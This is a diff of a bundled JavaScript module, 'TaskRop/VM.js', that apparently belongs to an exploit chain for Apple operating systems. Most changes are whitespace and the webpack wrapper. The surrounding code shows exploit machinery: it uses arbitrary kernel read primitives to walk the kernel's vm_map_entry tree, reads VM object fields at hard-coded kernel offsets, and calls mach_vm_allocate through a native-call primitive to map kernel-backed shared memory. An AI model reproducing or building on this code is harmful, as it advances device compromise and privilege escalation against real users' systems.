@@ -1,3 +1,9 @@
+/***/ "./src/libs/TaskRop/VM.js":
+/*!********************************!*\
+  !*** ./src/libs/TaskRop/VM.js ***!
+  \********************************/
+/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+
 __webpack_require__.r(__webpack_exports__);
 /* harmony export */ __webpack_require__.d(__webpack_exports__, {
 /* harmony export */   "default": () => (/* binding */ VM)
@@ -147,26 +153,26 @@ class VM
 	static #vm_getEntry(map,address)
 	{
 		let rbhRoot = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(map + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().hdrRBHRoot);
-
+		
 		//console.log(TAG,`Get entry:${Utils.hex(address)}`);
 		//console.log(TAG,`rbh root:${Utils.hex(rbhRoot)}`);
-
+	
 		let rbEntry = rbhRoot;
 		let foundEntry = 0n;
-
+	
 		while (rbEntry != 0n)
 		{
 			let curPtr = rbEntry - 0x20n; // container_of(rb_entry, struct vm_map_entry, store)
 			//uint64_t prev = 0;
-
+	
 			let links = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read(curPtr, links, VM_LINK_SIZE);
 			let linksBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(links,VM_LINK_SIZE);
 			let linksArray = new Uint8Array(linksBuffer);
 			links = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_links(linksArray);
-
+	
 			//console.log(TAG,`[${Utils.hex(links.start)} - ${Utils.hex(links.end)}]:${Utils.hex(curPtr)}`);
-
+	
 			if (address >= links.start)
 			{
 				if (address < links.end)
@@ -175,7 +181,7 @@ class VM
 					//console.log(TAG,`Found:${Utils.hex(curPtr)}`);
 					break;
 				}
-
+	
 				let rbeRight = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(rbEntry +  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().rbeRight);
 				rbEntry = rbeRight;
 				//prev = curPtr;
@@ -198,7 +204,7 @@ class VM
 		//	vmObject.address,
 		//	vmObject.objectOffset,
 		//	vmObject.entryOffset);
-
+		
 		if (!vmObject.address)
 			return null;
 
@@ -232,7 +238,7 @@ class VM
 
 		let objectOffs = this.#VME_OFFSET(entry);
 		let entryOffs = address - entry.links.start + objectOffs;
-
+		
 		//console.log(TAG, `object offset: ${Utils.hex(objectOffs)}`);
 		//console.log(TAG, `entry offset: ${Utils.hex(entryOffs)}`);
 
@@ -250,9 +256,9 @@ class VM
 		let shmem = new _VMShmem__WEBPACK_IMPORTED_MODULE_6__["default"](shmemBuff);
 		let size = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().vouSize);
 		size = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].round_page(size);
-
+		
 		//console.log(TAG,`vm object size:${Utils.hex(size)}`);
-
+		
 		let localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
 		let roundedSize = this.#round_page_kernel(size);
 		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_allocate",0x203n, localAddr, roundedSize, VM_FLAGS_ANYWHERE);
@@ -276,7 +282,7 @@ class VM
 		let resView = new DataView(resBuff);
 		let port = resView.getUint32(0,true);
 		*/
-
+		
 		let memory_object = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x500n;
 		let roundedSizePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x1000n;
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(roundedSizePtr, roundedSize);
@@ -357,7 +363,7 @@ class VM
 		shmem.localAddress = mappedAddr;
 		return shmem;
 	}
-
+	
 	static mocker(addrUnpack,addrPack)
 	{
 		let paramsBuff = new ArrayBuffer(VMPackingSize);
@@ -372,3 +378,6 @@ class VM
 		//console.log(TAG,`vmeObjectpack:${Utils.hex(vmeObject)}`);
 	}
 }
+
+
+/***/ }),
